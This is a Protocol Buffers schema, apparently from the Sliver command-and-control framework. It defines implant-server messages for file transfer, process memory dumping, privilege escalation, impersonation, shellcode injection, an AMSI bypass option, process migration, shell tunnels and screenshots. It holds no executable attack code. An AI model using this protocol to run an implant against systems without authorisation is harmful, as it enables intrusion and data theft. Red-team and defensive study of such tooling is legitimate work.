syntax = "proto3";
package sliverpb;

import "common/common.proto";


// Envelope - Used to encode implant<->server messages since we 
//            cannot use gRPC due to the various transports used.
message Envelope {
  uint64 ID = 1;
  uint32 Type = 2; // Message type
  bytes Data = 3; // Actual message data
}

// Register - First message the implant sends to the server
message Register {
  string Name = 1;
  string Hostname = 2;
  string Username = 3;
  string Uid = 4;
  string Gid = 5;
  string Os = 6;
  string Arch = 7;
  int32 Pid = 8;
  string Filename = 9;
  string ActiveC2 = 10;
  string Version = 11;
}

// Ping - Not ICMP, just sends a rount trip message to an implant to
//        see if it's still responding.
message Ping {
  int32 Nonce = 1;

  common.Response Response = 9;
}

// KillReq - Request the implant to kill a session
message KillReq {
  bool Force = 1;

  common.Request Request = 9;
}

// PsReq - Request the implant to list processes of a remote session.
message PsReq {
  common.Request Request = 9;
}

message Ps {
  repeated common.Process Processes = 1;

  common.Response Response = 9;
}

// TerminateReq - Request the implant terminate a remote processes
message TerminateReq {
  int32 Pid = 1;

  common.Request Request = 9;
}

message Terminate {
  common.Response Response = 9;
}

// IfconfigReq - Request the implant to list network interfaces
message IfconfigReq {
  common.Request Request = 9;
}

message Ifconfig {
  repeated NetInterface NetInterfaces = 1;

  common.Response Response = 9;
}

message NetInterface {
  int32 Index = 1;
  string Name = 2;
  string MAC = 3;
  repeated string IPAddresses = 4;
}

message LsReq {
  string Path = 1;

  common.Request Request = 9;
}

message Ls {
  string Path = 1;
  bool Exists = 2;
  repeated FileInfo Files = 3;

  common.Response Response = 9;
}

message FileInfo {
  string Name = 1;
  bool IsDir = 2;
  int64 Size = 3;
}

message CdReq {
  string Path = 1;
  common.Request Request = 9;
}

message PwdReq {
  common.Request Request = 9;
}

message Pwd {
  string Path = 1;

  common.Response Response = 9;
}

message RmReq {
  string Path = 1;

  common.Request Request = 9;
}

message Rm {
  bool Success = 1;
  string Path = 2;

  common.Response Response = 9;
}

message MkdirReq {
  string Path = 1;

  common.Request Request = 9;
}

message Mkdir {
  bool Success = 1;
  string Path = 2;

  common.Response Response = 9;
}

message DownloadReq {
  string Path = 1;

  common.Request Request = 9;
}

message Download {
  string Path = 1;
  string Encoder = 2;
  bool Exists = 3;
  bytes Data = 4;

  common.Response Response = 9;
}

message UploadReq {
  string Path = 1;
  string Encoder = 2;
  bytes Data = 3;

  common.Request Request = 9;
}

message Upload {
  string Path = 1;
  bool Success = 2;

  common.Response Response = 9;
}

message ProcessDumpReq {
  int32 Pid = 1;
  int32 Timeout = 2;

  common.Request Request = 9;
}

message ProcessDump {
  bytes Data = 1;

  common.Response Response = 9;
}

message RunAsReq {
  string Username = 1;
  string Process = 2;
  string Args = 3;

  common.Request Request = 9;
}

message RunAs {
  string Output = 1;

  common.Response Response = 9;
}

message ImpersonateReq {
  string Username = 1;
  common.Request Request = 9;
}

message Impersonate {
  common.Response Response = 9;
}

message RevToSelfReq {
  common.Request Request = 9;
}

message RevToSelf {
  common.Response Response = 9;
}

message GetSystemReq {
  bytes Data = 1;
  string HostingProcess = 2;

  common.Request Request = 9;
}

message GetSystem {
  string Output = 1;

  common.Response Response = 9;
}

message ElevateReq {
  int32 Timeout = 1;

  common.Request Request = 9;
}

message Elevate {
  bool Success = 1;

  common.Response Response = 9;
}

message TaskReq {
  string Encoder = 1;
  bool RWXPages = 2;
  uint32 Pid = 3;
  bytes Data = 4;

  common.Request Request = 9;
}

message RemoteTaskReq {
  string Encoder = 2;
  int32 Pid = 3;
  bool RWXPages = 4;
  bytes Data = 9;
}

message Task {
  common.Response Response = 9;
}

message ExecuteAssemblyReq {
  bytes HostingDll = 1;
  bytes Assembly = 2;
  string Arguments = 3;
  string Process = 4;
  bool AmsiBypass = 5;

  common.Request Request = 9;
}

message ExecuteAssembly {
  string Output = 1;

  common.Response Response = 9;
}

message MigrateReq {
  uint32 Pid = 1;
  bytes Data = 2;

  common.Request Request = 9;
}

message Migrate {
  bool Success = 1;

  common.Response Response = 9;
}

message ExecuteReq {
  string Path = 1;
  repeated string Args = 2;
  bool Output = 3;

  common.Request Request = 9;
}

message Execute {
  string Result = 1;

  common.Response Response = 9;
}

message SideloadReq {
  bytes Data = 1;
  string ProcName = 2;
  string Args = 3;

  common.Request Request = 9;
}

message Sideload {
  string Result = 1;

  common.Response Response = 9;
}

message SpawnDllReq {
  bytes Data = 1;
  string ProcName = 2;
  uint32 Offset = 3;
  string Args = 4;

  common.Request Request = 9;
}

message SpawnDll {
  string Result = 1;

  common.Response Response = 9;
}

message NetstatReq {
  bool TCP = 1;
  bool UDP = 2;
  bool IP4 = 3;
  bool IP6 = 5;
  bool Listening = 6;

  common.Request Request = 9;
}

message SockTabEntry {
  message SockAddr {
    string Ip = 1;
    uint32 Port = 2;
  }
  SockAddr LocalAddr = 1;
  SockAddr RemoteAddr = 2;
  string SkState = 3;
  uint32 UID = 4;
  Process Proc = 5;
  string Proto = 6;
}

message Netstat {
  repeated SockTabEntry Entries = 1;

  common.Response Response = 9;
}

// DNS Specific messages
message DNSSessionInit {
  bytes Key = 1;
}

message DNSPoll {
  repeated DNSBlockHeader blocks = 1;
}

message DNSBlockHeader {
  string ID = 1;
  uint32 Size = 2;
}

// HTTP Sepecific message
message HTTPSessionInit {
  bytes Key = 1;
}

// Tunnels, shells, and port fwds
message TunnelData {
  bytes Data = 1;
  bool Close = 2;

  uint64 TunnelID = 8;
  uint32 SessionID = 9;
}

message TunnelClose {
  uint64 TunnelID = 8;
  uint32 SessionID = 9;
}

// ShellReq - Request the implant open a realtime shell tunnel
message ShellReq {
  string Path = 1;
  bool EnablePTY = 2;

  common.Request Request = 9;
}

message Shell {
  bool Success = 1;
  string Err = 2;
  uint32 Pid = 3;

  uint64 TunnelID = 8;
  uint32 SessionID = 9;
}

// ScreenshotReq - Request the implant take a screenshot
message ScreenshotReq {
  common.Request Request = 9;
}

message Screenshot {
  bytes Data = 1;

  common.Response Response = 9;
}
